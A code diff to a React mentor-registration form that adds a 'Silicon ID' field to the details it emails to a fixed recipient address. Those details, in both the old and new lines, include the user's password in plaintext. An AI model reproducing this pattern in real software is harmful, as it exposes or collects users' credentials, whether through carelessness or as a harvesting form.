@@ -7,6 +7,7 @@ import FooterSection from "@/components/FooterSection";
 const SkillUpgrade = () => {
   const navigate = useNavigate();
   const [name, setName] = useState("");
+  const [siliconId, setSiliconId] = useState("");
   const [email, setEmail] = useState("");
   const [phone, setPhone] = useState("");
   const [password, setPassword] = useState("");
@@ -35,7 +36,7 @@ const SkillUpgrade = () => {
           from_name: name,
           email,
           to_email: RECIPIENT_EMAIL,
-          message: `New mentor registration details:\n\nName: ${name}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`,
+          message: `New mentor registration details:\n\nName: ${name}\nSilicon ID: ${siliconId}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`,
           source: "mentor-gallery-web",
         }),
       });
@@ -97,6 +98,19 @@ const SkillUpgrade = () => {
                   onChange={(e) => setName(e.target.value)}
                   className="w-full bg-secondary border border-border rounded-lg px-4 py-3 text-foreground font-mono text-sm focus:outline-none focus:ring-2 focus:ring-primary"
                   placeholder="Enter your name"
+                />
+              </div>
+              <div>
+                <label className="block text-foreground font-mono text-sm mb-2">
+                  Silicon ID
+                </label>
+                <input
+                  type="text"
+                  required
+                  value={siliconId}
+                  onChange={(e) => setSiliconId(e.target.value)}
+                  className="w-full bg-secondary border border-border rounded-lg px-4 py-3 text-foreground font-mono text-sm focus:outline-none focus:ring-2 focus:ring-primary"
+                  placeholder="Enter your Silicon ID"
                 />
               </div>
               <div>
